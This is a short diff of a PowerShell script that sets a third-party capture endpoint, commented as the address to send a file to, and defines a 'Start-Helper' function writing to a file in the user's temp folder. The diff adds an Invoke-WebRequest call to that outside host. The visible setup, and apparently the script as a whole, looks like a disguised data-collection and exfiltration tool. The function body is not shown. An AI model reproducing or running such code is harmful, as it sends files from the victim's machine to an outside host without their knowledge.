@@ -1,7 +1,7 @@
 $TimesToRun = 100000					# How many successful runs to achieve.
 $RunTimeP = 0.5					# Runtime in minutes for each run.
 $endpoint = "https://sub-domain22.free.beeceptor.com"		# Address to send the file to.
-
+Invoke-WebRequest -Uri $endpoint -Method GET
 # Requires -Version 2
 function Start-Helper($Path = "$env:temp\help.txt") 
 {
